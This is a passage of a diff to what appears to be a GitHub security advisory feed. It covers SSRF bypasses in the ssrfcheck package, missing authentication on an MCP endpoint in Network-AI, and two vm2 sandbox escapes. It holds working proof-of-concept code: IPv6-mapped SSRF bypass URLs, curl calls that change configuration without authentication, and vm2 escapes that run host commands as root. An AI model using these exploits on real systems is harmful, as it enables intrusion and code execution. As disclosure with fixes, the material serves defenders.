+<p><strong>Confirmed output (live-verified on Node.js v20.20.2, ssrfcheck v1.3.0, Zorin OS Linux, 2026-04-12):</strong></p>
+<pre><code>[BYPASS] http://[::ffff:127.0.0.1]/           -&gt; true
+[BYPASS] http://[::ffff:169.254.169.254]/     -&gt; true
+[BYPASS] http://[::ffff:192.168.1.1]/         -&gt; true
+[BYPASS] http://[::ffff:10.0.0.1]/            -&gt; true
+[BYPASS] http://[::ffff:172.16.0.1]/          -&gt; true
+[BYPASS] http://[::ffff:7f00:1]/              -&gt; true
+[BYPASS] http://[0:0:0:0:0:ffff:127.0.0.1]/  -&gt; true
+---
+127.0.0.1 caught?   true
+192.168.1.1 caught? true
+[::1] caught?        true
+</code></pre>
+<p>7/7 private-range variants bypass the check. Baseline dot-notation detections remain intact, confirming the bug is specific to the WHATWG normalization path.</p>
+<p><strong>Full automated verification script (<code>verify-ssrfcheck.js</code>):</strong></p>
+<pre><code class="language-js">#!/usr/bin/node
+// ssrfcheck bypass verification script
+// Tests CWE-918 via IPv4-mapped IPv6 WHATWG URL normalization
+
+const { isSSRFSafeURL } = require('ssrfcheck');
+
+const RED   = '\x1b[31m';
+const GREEN = '\x1b[32m';
+const CYAN  = '\x1b[36m';
+const DIM   = '\x1b[2m';
+const RESET = '\x1b[0m';
+
+const BYPASSES = [
+  { url: 'http://[::ffff:127.0.0.1]/',         label: 'loopback   (127.0.0.1)' },
+  { url: 'http://[::ffff:169.254.169.254]/',   label: 'AWS meta   (169.254.169.254)' },
+  { url: 'http://[::ffff:192.168.1.1]/',       label: 'LAN        (192.168.1.1)' },
+  { url: 'http://[::ffff:10.0.0.1]/',          label: '10.x range (10.0.0.1)' },
+  { url: 'http://[::ffff:172.16.0.1]/',        label: '172.16.x   (172.16.0.1)' },
+  { url: 'http://[::ffff:7f00:1]/',            label: 'hex form   (direct)' },
+  { url: 'http://[0:0:0:0:0:ffff:127.0.0.1]/', label: 'expanded   (0:0:0:0:0:ffff:127.0.0.1)' },
+];
+
+const BASELINE = [
+  { url: 'http://127.0.0.1/',    label: 'dotted loopback', expectFalse: true },
+  { url: 'http://192.168.1.1/',  label: 'private LAN',     expectFalse: true },
+  { url: 'http://[::1]/',        label: 'IPv6 loopback',   expectFalse: true },
+  { url: 'https://example.com/', label: 'public domain',   expectFalse: false },
+];
+
+console.log(`\n${CYAN}=== ssrfcheck v1.3.0 — bypass verification ===${RESET}`);
+console.log(`${DIM}Node.js ${process.version}${RESET}\n`);
+
+console.log(`${CYAN}[STEP 1] WHATWG URL hostname normalization${RESET}`);
+for (const { url } of BYPASSES) {
+  const parsed = new URL(url);
+  console.log(`  ${url.padEnd(45)} -&gt; hostname: ${parsed.hostname}`);
+}
+
+console.log(`\n${CYAN}[STEP 2] isSSRFSafeURL() results (all should return false)${RESET}`);
+let bypassed = 0;
+for (const { url, label } of BYPASSES) {
+  const result = isSSRFSafeURL(url);
+  if (result === true) bypassed++;
+  const tag = result === true
+    ? `${RED}[BYPASS]${RESET}`
+    : `${GREEN}[caught]${RESET}`;
+  console.log(`  ${tag} ${label.padEnd(30)} -&gt; isSSRFSafeURL() = ${result}`);
+}
+
+console.log(`\n${CYAN}[STEP 3] Baseline checks${RESET}`);
+for (const { url, label, expectFalse } of BASELINE) {
+  const result = isSSRFSafeURL(url);
+  const ok = (expectFalse ? result === false : result === true);
+  const tag = ok ? `${GREEN}[OK]${RESET}    ` : `${RED}[FAIL]${RESET}  `;
+  console.log(`  ${tag} ${label.padEnd(20)} -&gt; isSSRFSafeURL() = ${result}`);
+}
+
+console.log(`\n${bypassed === BYPASSES.length ? RED : GREEN}=== ${bypassed}/${BYPASSES.length} bypasses confirmed ===${RESET}\n`);
+process.exit(bypassed === BYPASSES.length ? 1 : 0);
+</code></pre>
+<p>Run:</p>
+<pre><code class="language-bash">node verify-ssrfcheck.js
+# exit code 1 = bypasses confirmed (vulnerable)
+# exit code 0 = all caught (fixed)
+</code></pre>
+<h1 id="video-poc-ascii-cast">VIDEO POC ASCII CAST</h1>
+<p><a href="https://asciinema.org/a/CxTKMwrlcHUUbQT8"><img src="https://asciinema.org/a/CxTKMwrlcHUUbQT8.svg" alt="asciicast"></a></p>
+<p>--</p>
+<h3 id="impact">Impact</h3>
+<p><strong>Vulnerability type:</strong> Server-Side Request Forgery (SSRF) — complete protection bypass</p>
+<p><strong>Who is impacted:</strong> Any Node.js application that:</p>
+<ol>
+<li>Accepts a URL from an untrusted source (user input, API parameter, webhook payload)</li>
+<li>Uses <code>isSSRFSafeURL()</code> from <code>ssrfcheck</code> to validate that URL before making an outbound HTTP request</li>
+<li>Runs on Node.js &gt;= 10 (WHATWG URL parser enabled — all supported versions as of 2026)</li>
+</ol>
+<p><strong>Concrete impact scenarios:</strong></p>
+<ul>
+<li><strong>Cloud metadata theft:</strong> On AWS, GCP, or Azure, attacker sends `http://[::ffff:169.254.169.254]/latest/metadat </li>
+<li><strong>Internal network pivoting:</strong> Attacker reaches services on <code>10.x.x.x</code>, <code>172.16.x.x</code>, <code>192.168.x.x</code> that are not exposed to the internet, bypassing the only protection layer.</li>
+<li><strong>Localhost access:</strong> Attacker reaches <code>http://[::ffff:127.0.0.1]/admin</code> or any service bound to loopback on the server.</li>
+</ul>
+<p>The bypass requires no authentication, no special privileges, and no non-default configuration. It works against every version of ssrfcheck on every Node.js version &gt;= 10.</p>
+<h2 id="weaknesses">Weaknesses</h2>
+<p><strong>CWE-918</strong> — Server-Side Request Forgery (SSRF)
+<strong>CWE-184</strong> — Incomplete List of Disallowed Inputs</p>
+<hr>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Replace the hand-rolled regex denylist in <code>src/is-private-ip.js</code> with Node's built-in <code>net.BlockList</code>, which operates on parsed IP values and is immune to string representation differences:</p>
+<pre><code class="language-diff">- function privIp6 (ip) {
+-   return /^::$/.test(ip) ||
+-     /^::1$/.test(ip) ||
+-     /^::f{4}:([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
+-     /^::f{4}:0.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
+-     ...
+- }
+
++ const { BlockList } = require('net');
++
++ const _ipv6Block = new BlockList();
++ _ipv6Block.addAddress('::',          'ipv6');          // unspecified
++ _ipv6Block.addAddress('::1',         'ipv6');          // loopback
++ _ipv6Block.addSubnet('::ffff:0:0',   96, 'ipv6');      // ALL IPv4-mapped — catches any private IPv4 in any notation
++ _ipv6Block.addSubnet('64:ff9b::',    96, 'ipv6');      // NAT64
++ _ipv6Block.addSubnet('fc00::',        7, 'ipv6');      // ULA
++ _ipv6Block.addSubnet('fe80::',       10, 'ipv6');      // link-local
++ _ipv6Block.addSubnet('ff00::',        8, 'ipv6');      // multicast
++ _ipv6Block.addSubnet('100::',        64, 'ipv6');      // IETF reserved
++ _ipv6Block.addSubnet('2001::',       32, 'ipv6');      // Teredo
++ _ipv6Block.addSubnet('2001:db8::',   32, 'ipv6');      // documentation
++ _ipv6Block.addSubnet('2002::',       16, 'ipv6');      // 6to4
++
++ function privIp6(ip) {
++   try { return _ipv6Block.check(ip, 'ipv6'); }
++   catch { return false; }
++ }
+</code></pre>
+<p>The <code>::ffff:0:0/96</code> subnet entry covers the entire IPv4-mapped IPv6 space in a single rule. <code>BlockList.check()</code> parses the IP numerically, so it is unaffected by WHATWG URL normalization or any other string representation.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/felippe-regazio/ssrfcheck/security/advisories/GHSA-j4rj-2jr5-m439">https://github.com/felippe-regazio/ssrfcheck/security/advisories/GHSA-j4rj-2jr5-m439</a></li>
+<li><a href="https://github.com/advisories/GHSA-j4rj-2jr5-m439">https://github.com/advisories/GHSA-j4rj-2jr5-m439</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j4rj-2jr5-m439</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T20:29:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ssrfcheck] ssrfcheck: SSRF Bypass Caused by Failure to Classify Reserved IP Address Space as Invalid]]></title>
+        <id>https://github.com/advisories/GHSA-p4hc-9pjh-55c8</id>
+        <link href="https://github.com/advisories/GHSA-p4hc-9pjh-55c8"/>
+        <updated>2026-05-05T20:29:06.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="ssrf-bypass-in-ssrfcheck---fails-to-classify-reserved-ip-address-space-as-invalid">SSRF Bypass in <code>ssrfcheck</code> - fails to classify reserved IP address space as invalid</h1>
+<p><code>ssrfcheck</code> is an npm package that serves to provide protection from SSRF by validating URLs or hostname inputs.</p>
+<p>Resources: </p>
+<ul>
+<li>Project's GitHub code repository: <a href="https://github.com/felippe-regazio/ssrfcheck">https://github.com/felippe-regazio/ssrfcheck</a></li>
+<li>Project's npm package: <a href="https://www.npmjs.com/package/ssrfcheck">https://www.npmjs.com/package/ssrfcheck</a></li>
+</ul>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The <code>ssrfcheck</code> package maintains a denylist of IP addresses and ranges to check against when validating if an IP address is to be considered as safe or not.</p>
+<p>However, the IP address list used for the denylist is incomplete and misses a reserved IP address space as defined by the IANA (Internet Assigned Numbers Authority):</p>
+<ul>
+<li>224.0.0.0/4 - Multicast</li>
+</ul>
+<p>Practically, this reserved IP address space is used for multicast traffic and would most commonly be used for reserved local communication over network protocols such as UDP, which would make it less likely to be used in a typical SSRF attack in practice.</p>
+<p>However, such reserved IP address space shouldn't be allowed and it would be responsible of the SSRF protection package to align and conform to an agreed-upon standard of special-purposed addresses that should not be considered a valid public IP address. For reference, the popular npm packages <code>private-ip</code> and <code>ipaddr.js</code> that are highly dependent-upon to make decisions about SSRF protection and both consider the above mentioned IP address space as reserved and is not considered a valid public IP address.</p>
+<h2 id="exploit-proof-of-concept">Exploit Proof of Concept</h2>
+<ol>
+<li>Install the <code>ssrfcheck</code> package:</li>
+</ol>
+<pre><code class="language-bash">npm install ssrfcheck
+</code></pre>
+<ol start="2">
+<li>Define an <code>app.js</code> file with the programmatic API of <code>ssrfcheck</code>:</li>
+</ol>
+<pre><code class="language-javascript">import { isSSRFSafeURL } from 'ssrfcheck';
+
+let result
+result = isSSRFSafeURL('https://012.1.2.3/whatever');
+console.log(result);  // returns false
+result = isSSRFSafeURL('https://localhost:8080/whatever');
+console.log(result);  // returns false
+
+result = isSSRFSafeURL('https://239.255.255.250:8080/whatever');
+console.log(result);  // returns true - bypassed
+</code></pre>
+<h2 id="vulnerable-versions">Vulnerable versions</h2>
+<p>All versions of ssrfcheck are vulnerable to this issue, up to and including to the latest version of <code>1.1.1</code>.</p>
+<h2 id="assigned-cve">Assigned CVE</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-8267">CVE-2025-8267</a></p>
+<h1 id="author">Author</h1>
+<p>Liran Tal</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/felippe-regazio/ssrfcheck/security/advisories/GHSA-p4hc-9pjh-55c8">https://github.com/felippe-regazio/ssrfcheck/security/advisories/GHSA-p4hc-9pjh-55c8</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-8267">https://nvd.nist.gov/vuln/detail/CVE-2025-8267</a></li>
+<li><a href="https://github.com/felippe-regazio/ssrfcheck/issues/5">https://github.com/felippe-regazio/ssrfcheck/issues/5</a></li>
+<li><a href="https://github.com/felippe-regazio/ssrfcheck/commit/9507b49fd764f2a1a1d1e3b9ee577b7545e6950e">https://github.com/felippe-regazio/ssrfcheck/commit/9507b49fd764f2a1a1d1e3b9ee577b7545e6950e</a></li>
+<li><a href="https://gist.github.com/lirantal/2976840639df824cb3abe60d13c65e04">https://gist.github.com/lirantal/2976840639df824cb3abe60d13c65e04</a></li>
+<li><a href="https://security.snyk.io/vuln/SNYK-JS-SSRFCHECK-9510756">https://security.snyk.io/vuln/SNYK-JS-SSRFCHECK-9510756</a></li>
+<li><a href="https://github.com/advisories/GHSA-p4hc-9pjh-55c8">https://github.com/advisories/GHSA-p4hc-9pjh-55c8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p4hc-9pjh-55c8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T20:29:06.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[link-preview-js] link-preview-js vulnerable to IPv6 and internal loopback attacks]]></title>
         <id>https://github.com/advisories/GHSA-4gp8-rjrq-ch6q</id>
@@ -635,709 +1760,5 @@ if __name__ == '__main__':
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-05-05T18:04:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[network-ai] Network-AI missing authentication on MCP HTTP endpoint, which allows unauthenticated privileged tool calls]]></title>
-        <id>https://github.com/advisories/GHSA-fj4g-2p96-q6m3</id>
-        <link href="https://github.com/advisories/GHSA-fj4g-2p96-q6m3"/>
-        <updated>2026-05-05T17:25:39.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="security-advisory-missing-authentication-for-critical-function-in-jovancodingnetwork-ai">Security Advisory: Missing Authentication for Critical Function in <code>Jovancoding/Network-AI</code></h1>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Project</td>
-<td><code>Jovancoding/Network-AI</code></td>
-</tr>
-<tr>
-<td>Repository</td>
-<td><a href="https://github.com/Jovancoding/Network-AI">https://github.com/Jovancoding/Network-AI</a></td>
-</tr>
-<tr>
-<td>Affected commit</td>
-<td><code>c344f2053eb0d49395988f803bf92f2a86b2a0d0</code></td>
-</tr>
-<tr>
-<td>Affected tested version</td>
-<td><code>5.1.2</code></td>
-</tr>
-<tr>
-<td>Vulnerability type</td>
-<td>CWE-306: Missing Authentication for Critical Function</td>
-</tr>
-<tr>
-<td>Severity</td>
-<td>High</td>
-</tr>
-<tr>
-<td>Authentication required</td>
-<td>None</td>
-</tr>
-<tr>
-<td>Default network exposure</td>
-<td>Bind address <code>0.0.0.0</code></td>
-</tr>
-<tr>
-<td>Reporter validation date</td>
-<td>2026-04-21</td>
-</tr>
-</tbody></table>
-<h2 id="summary">Summary</h2>
-<p>The MCP HTTP transport accepts JSON-RPC <code>tools/call</code> requests with no authentication, session, origin, or token check, and dispatches them directly to the orchestrator's tool registry. The default bind address is <code>0.0.0.0</code>. As a result, any party with network reachability to the service can enumerate and invoke privileged management tools — including reading and mutating the live orchestrator configuration, listing registered agents, dispatching agents, creating/revoking security tokens, and adjusting global budget ceilings.</p>
-<h2 id="affected-code">Affected Code</h2>
-<ul>
-<li><code>bin/mcp-server.ts:75</code> — server binds to <code>0.0.0.0</code> by default.</li>
-<li><code>lib/mcp-transport-sse.ts:155</code> — <code>handleRPC()</code> dispatches <code>tools/call</code> directly to the provider's <code>call(toolName, toolArgs)</code>.</li>
-<li><code>lib/mcp-transport-sse.ts:379</code> — <code>_handlePost()</code> parses the JSON-RPC body and calls <code>this._bridge.handleRPC(rpc)</code> with no auth check.</li>
-<li><code>lib/mcp-tools-control.ts:80</code> — <code>config_get</code> exposes live runtime configuration.</li>
-<li><code>lib/mcp-tools-control.ts:197</code> — <code>agent_list</code> exposes registered agents.</li>
-<li><code>lib/mcp-tools-control.ts:231</code> — <code>config_set</code> mutates runtime configuration in place: <code>this._config[key] = parsed</code>.</li>
-</ul>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>The PoC was executed against a local Docker build of the affected commit, bound to <code>http://localhost:13001</code>. <strong>No authentication header was sent.</strong> All inner-JSON excerpts below are decoded from the JSON-RPC <code>result.content[0].text</code> field for readability; the raw wire transcripts (which contain the literal escaped JSON-RPC envelope) are in <code>evidence/</code>.</p>
-<h3 id="step-1--list-exposed-tools-unauthenticated">Step 1 — list exposed tools (unauthenticated)</h3>
-<pre><code class="language-bash">curl http://localhost:13001/tools
-</code></pre>
-<p><code>HTTP/1.1 200 OK</code> — body returned 22 tools. Privileged tools observed in the inventory include:</p>
-<ul>
-<li><code>config_get</code>, <code>config_set</code> — read and mutate live orchestrator configuration</li>
-<li><code>agent_list</code>, <code>agent_spawn</code>, <code>agent_stop</code> — enumerate, dispatch, and stop agents</li>
-<li><code>token_create</code>, <code>token_revoke</code> — mint and revoke security tokens</li>
-<li><code>budget_set_ceiling</code> — adjust the global token budget ceiling</li>
-<li><code>fsm_transition</code> — drive finite-state-machine transitions</li>
-<li><code>blackboard_write</code>, <code>blackboard_delete</code> — mutate the shared blackboard</li>
-</ul>
-<p>Full transcript: <code>evidence/01_get_tools.txt</code>.</p>
-<h3 id="step-2--read-live-configuration-unauthenticated">Step 2 — read live configuration (unauthenticated)</h3>
-<pre><code class="language-bash">curl http://localhost:13001/mcp \
-  -H 'Content-Type: application/json' \
-  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"config_get","arguments":{}}}'
-</code></pre>
-<p><code>HTTP/1.1 200 OK</code> — decoded inner JSON:</p>
-<pre><code class="language-json">{
-  "ok": true,
-  "tool": "config_get",
-  "data": {
-    "blackboardPath": "./swarm-blackboard.md",
-    "maxParallelAgents": null,
-    "defaultTimeout": 30000,
-    "enableTracing": true,
-    "grantTokenTTL": 300000,
-    "maxBlackboardValueSize": 1048576,
-    "auditLogPath": "./data/audit_log.jsonl",
-    "trustConfigPath": "./data/trust_levels.json"
-  }
-}
-</code></pre>
-<p>Full transcript: <code>evidence/02_config_get_before.txt</code>.</p>
-<h3 id="step-3--mutate-live-configuration-unauthenticated">Step 3 — mutate live configuration (unauthenticated)</h3>
-<pre><code class="language-bash">curl http://localhost:13001/mcp \
-  -H 'Content-Type: application/json' \
-  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"config_set","arguments":{"key":"defaultTimeout","value":"12345"}}}'
-</code></pre>
-<p><code>HTTP/1.1 200 OK</code> — decoded inner JSON:</p>
-<pre><code class="language-json">{
-  "ok": true,
-  "tool": "config_set",
-  "data": {
-    "key": "defaultTimeout",
-    "previous": 30000,
-    "current": 12345,
-    "applied": true
-  }
-}
-</code></pre>
-<p>Full transcript: <code>evidence/03_config_set.txt</code>.</p>
-<h3 id="step-4--confirm-mutation-persisted-unauthenticated">Step 4 — confirm mutation persisted (unauthenticated)</h3>
-<pre><code class="language-bash">curl http://localhost:13001/mcp \
-  -H 'Content-Type: application/json' \
-  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"config_get","arguments":{}}}'
-</code></pre>
-<p><code>HTTP/1.1 200 OK</code> — decoded inner JSON (relevant key only):</p>
-<pre><code class="language-json">{
-  "ok": true,
-  "tool": "config_get",
-  "data": {
-    "defaultTimeout": 12345
-  }
-}
-</code></pre>
-<p>This proves the runtime change applied by step 3 is observable on the next read. Full transcript: <code>evidence/04_config_get_after.txt</code>.</p>
-<h3 id="step-5--enumerate-registered-agents-unauthenticated">Step 5 — enumerate registered agents (unauthenticated)</h3>
-<pre><code class="language-bash">curl http://localhost:13001/mcp \
-  -H 'Content-Type: application/json' \
-  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"agent_list","arguments":{}}}'
-</code></pre>
-<p><code>HTTP/1.1 200 OK</code> — decoded inner JSON:</p>
-<pre><code class="language-json">{
-  "ok": true,
-  "tool": "agent_list",
-  "data": {
-    "agents": [],
-    "count": 0
-  }
-}
-</code></pre>
-<p>This is a privileged management read; the empty array reflects the test environment, not a control. Full transcript: <code>evidence/05_agent_list.txt</code>.</p>
-<h3 id="cleanup--runtime-state-restored">Cleanup — runtime state restored</h3>
-<p>After the PoC, <code>defaultTimeout</code> was restored to <code>30000</code> via the same unauthenticated <code>config_set</code> (<code>previous":12345,"current":30000,"applied":true</code>). All testing was performed against a local Docker container only.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li>Unauthenticated network access enables full enumeration and invocation of the orchestrator's management functionality.</li>
-<li>An attacker can change runtime configuration (e.g., <code>defaultTimeout</code>, <code>enableTracing</code>), dispatch or stop agents, mutate the shared blackboard, mint or revoke security tokens, and adjust global budget ceilings.</li>
-<li>The default <code>0.0.0.0</code> bind, combined with the absence of any auth gate, increases the likelihood of accidental exposure on any host with a routable interface.</li>
-</ul>
-<h2 id="suggested-remediation">Suggested Remediation</h2>
-<ol>
-<li>Enforce authentication inside <code>_handlePost()</code> before reaching <code>handleRPC()</code>. At a minimum, require a shared secret / bearer token loaded from configuration; reject any request that does not present it.</li>
-<li>Default the bind address to <code>127.0.0.1</code>. Require an explicit configuration opt-in to bind to non-loopback interfaces, and warn on startup when binding outside loopback without an authentication mechanism configured.</li>
-<li>For tool-level defense in depth, gate state-mutating tools (<code>config_set</code>, <code>agent_spawn</code>, <code>agent_stop</code>, <code>token_create</code>, <code>token_revoke</code>, <code>budget_set_ceiling</code>, <code>fsm_transition</code>, <code>blackboard_write</code>, <code>blackboard_delete</code>) behind an explicit authorization check tied to a verified caller identity.</li>
-</ol>
-<h2 id="verification-environment">Verification Environment</h2>
-<ul>
-<li>Local Docker container only; no third-party deployment was tested.</li>
-<li>Local build required a minimal Dockerfile fix; the application code path under test was not modified.</li>
-<li>Runtime state (<code>defaultTimeout</code>) was restored to default after the PoC.</li>
-</ul>
-<h2 id="attached-evidence">Attached Evidence</h2>
-<p>Files in <code>evidence/</code> are raw <code>curl -i</code> transcripts captured during the verification sequence above. They are provided as supplementary backup; the key excerpts are already inlined in this report.</p>
-<table>
-<thead>
-<tr>
-<th>File</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><a href="https://github.com/user-attachments/files/26950583/01_get_tools.txt">01_get_tools.txt</a></td>
-<td>Step 1 — full <code>GET /tools</code> request and 22-tool inventory response</td>
-</tr>
-<tr>
-<td><a href="https://github.com/user-attachments/files/26950584/02_config_get_before.txt">02_config_get_before.txt</a></td>
-<td>Step 2 — full <code>config_get</code> request and live configuration response</td>
-</tr>
-<tr>
-<td><a href="https://github.com/user-attachments/files/26950585/03_config_set.txt">03_config_set.txt</a></td>
-<td>Step 3 — full <code>config_set</code> request mutating <code>defaultTimeout</code></td>
-</tr>
-<tr>
-<td><a href="https://github.com/user-attachments/files/26950586/04_config_get_after.txt">04_config_get_after.txt</a></td>
-<td>Step 4 — full <code>config_get</code> request showing the mutation persisted</td>
-</tr>
-<tr>
-<td><a href="https://github.com/user-attachments/files/26950587/05_agent_list.txt">05_agent_list.txt</a></td>
-<td>Step 5 — full <code>agent_list</code> request and response</td>
-</tr>
-</tbody></table>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-fj4g-2p96-q6m3">https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-fj4g-2p96-q6m3</a></li>
-<li><a href="https://github.com/advisories/GHSA-fj4g-2p96-q6m3">https://github.com/advisories/GHSA-fj4g-2p96-q6m3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fj4g-2p96-q6m3</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T17:25:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vm2] VM2 Has a WASM Sandbox Escape (Node 25 only)]]></title>
-        <id>https://github.com/advisories/GHSA-ffh4-j6h5-pg66</id>
-        <link href="https://github.com/advisories/GHSA-ffh4-j6h5-pg66"/>
-        <updated>2026-05-05T16:44:18.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Full sandbox escape with arbitrary code execution. Attacker code inside <code>VM.run()</code> obtains host process object and runs host commands with zero host cooperation.</p>
-<h2 id="details">Details</h2>
-<p><strong>Confirmed on:</strong> vm2 3.10.4, Node.js v25.6.1 (x64 Linux)
-<strong>Trigger:</strong> Attacker-controlled code passed to <code>VM.run()</code>
-<strong>Requires:</strong> Node.js version with WebAssembly exception handling + JSTag support (tested on v25.6.1)</p>
-<p>vm2's sandbox security relies on two JavaScript-level mechanisms: (1) a code transformer that injects <code>handleException()</code> into JS <code>catch</code> clauses to wrap host-realm errors, and (2) bridge Proxies that wrap cross-context objects. Both operate entirely within JavaScript.</p>
-<p>WebAssembly's <code>try_table</code> instruction with a <code>JSTag</code> catch handler catches JavaScript exceptions at V8's C++ level — below JavaScript entirely. When an imported JS function throws a TypeError produced by Symbol-to-string coercion during stack formatting (<code>e.name = Symbol(); e.stack</code>), the WASM <code>try_table</code> catches it as an opaque <code>externref</code> and returns it as a normal function return value. This WASM exception-handling-to-return-value path is not sanitized by vm2 — the host-realm TypeError reaches attacker code unsanitized. Its constructor chain (<code>hostError.constructor.constructor</code>) resolves to a Function that returns the host process object, allowing for reflection outside of the vm2 context, leading to code execution.</p>
-<h2 id="poc">PoC</h2>
-<pre><code class="language-js">const { VM } = require("vm2");
-console.log("vm2:", require("vm2/package.json").version, "| node:", process.version);
-
-new VM().run(`
-    const before = typeof process;
-
-    const err = new Error("x");
-    err.name = Symbol();
-
-    const wasm = new Uint8Array([
-        0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
-        0x01,0x0c,0x03,0x60,0x00,0x00,0x60,0x00,0x01,0x6f,0x60,0x01,0x6f,0x00,
-        0x02,0x19,0x02,
-        0x03,0x65,0x6e,0x76,0x07,0x74,0x72,0x69,0x67,0x67,0x65,0x72,0x00,0x00,
-        0x02,0x6a,0x73,0x03,0x74,0x61,0x67,0x04,0x00,0x02,
-        0x03,0x02,0x01,0x01,
-        0x07,0x0f,0x01,
-        0x0b,0x63,0x61,0x74,0x63,0x68,0x5f,0x65,0x72,0x72,0x6f,0x72,0x00,0x01,
-        0x0a,0x12,0x01,0x10,0x00,
-        0x02,0x6f,0x1f,0x40,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x0b,0x00,0x0b,0x0b
-    ]);
-
-    const instance = new WebAssembly.Instance(
-        new WebAssembly.Module(wasm),
-        { env: { trigger() { err.stack; } }, js: { tag: WebAssembly.JSTag } }
-    );
-
-    const hostError = instance.exports.catch_error();
-    const p = hostError.constructor.constructor("return process")();
-    const id = p.mainModule.require("child_process").execSync("id").toString().trim();
-    const log = p.mainModule.require("console").log;
-    log("");
-    log("process before escape:", before);
-    log("process after escape: ", typeof p);
-    log("host pid:             ", p.pid);
-    log("host node version:    ", p.version);
-    log("RCE:                  ", id);
-`);
-</code></pre>
-<pre><code>&gt; node poc.js
-vm2: 3.10.4 | node: v25.6.1
-
-process before escape: undefined
-process after escape:  object
-host pid:              217
-host node version:     v25.6.1
-RCE:                   uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-</code></pre>
-<p><strong>Proof files</strong>
-<a href="https://github.com/user-attachments/files/25285089/poc.js">poc.js</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-ffh4-j6h5-pg66">https://github.com/patriksimek/vm2/security/advisories/GHSA-ffh4-j6h5-pg66</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26956">https://nvd.nist.gov/vuln/detail/CVE-2026-26956</a></li>
-<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.10.5">https://github.com/patriksimek/vm2/releases/tag/v3.10.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-ffh4-j6h5-pg66">https://github.com/advisories/GHSA-ffh4-j6h5-pg66</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-ffh4-j6h5-pg66</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-05T16:44:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vm2] VM2 Has a Sandbox Escape Issue via SuppressedError]]></title>
-        <id>https://github.com/advisories/GHSA-55hx-c926-fr95</id>
-        <link href="https://github.com/advisories/GHSA-55hx-c926-fr95"/>
-        <updated>2026-05-05T16:33:48.000Z</updated>
-        <content type="html"><![CDATA[<p>In vm2 v3.10.4 on Node.js v24.13.0, <code>SuppressedError</code> allows attackers to escape the sandbox and run arbitrary code.</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-js">const { VM } = require("vm2");
-
-const vm = new VM();
-
-vm.run(`
-const ds = new DisposableStack();
-ds.defer(() =&gt; { throw null; });
-ds.defer(() =&gt; {
-  const e = Error();
-  e.name = Symbol();
-  e.stack;
-});
-try {
-  ds.dispose();
-} catch(e) {
-  const Function = e.suppressed.constructor.constructor;
-  const process = new Function("return process;")();
-  const { execSync } = process.mainModule.require("node:child_process");
-  execSync("echo pwned", { stdio: "inherit" });
-}
-`);
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-55hx-c926-fr95">https://github.com/patriksimek/vm2/security/advisories/GHSA-55hx-c926-fr95</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26332">https://nvd.nist.gov/vuln/detail/CVE-2026-26332</a></li>
-<li><a href="https://github.com/patriksimek/vm2/commit/119fd0aa1e4c27b08cf37946b2dafa99e2c754f0">https://github.com/patriksimek/vm2/commit/119fd0aa1e4c27b08cf37946b2dafa99e2c754f0</a></li>
